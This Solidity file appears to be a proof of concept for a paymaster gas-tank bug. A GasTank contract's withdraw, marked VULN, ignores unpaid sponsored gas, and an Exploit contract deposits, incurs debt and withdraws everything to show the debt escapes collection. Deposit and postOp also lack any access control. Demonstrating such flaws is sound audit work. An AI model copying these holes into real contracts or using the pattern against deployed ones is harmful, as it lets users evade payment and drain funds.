// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract GasTank {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public unpaid;

    function deposit(address user, uint256 amount) external {
        balances[user] += amount;
    }

    function postOp(address user, uint256 gasCost) external {
        unpaid[user] += gasCost;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        // @> VULN: withdrawal ignores unpaid sponsored transactions.
        balances[msg.sender] -= amount;
    }
}

contract Exploit {
    GasTank public gasTank;
    uint256 public escaped;
    uint256 public outstanding;

    constructor() {
        gasTank = new GasTank();
    }

    function run() external {
        gasTank.deposit(address(this), 100);
        // Paymaster already sponsored an operation; settlement is asynchronous.
        gasTank.postOp(address(this), 80);
        gasTank.withdraw(100);
        escaped = gasTank.balances(address(this)) == 0 ? 100 : 0;
        outstanding = gasTank.unpaid(address(this));
        require(escaped == 100 && outstanding == 80, "gas debt was collected");
    }
}
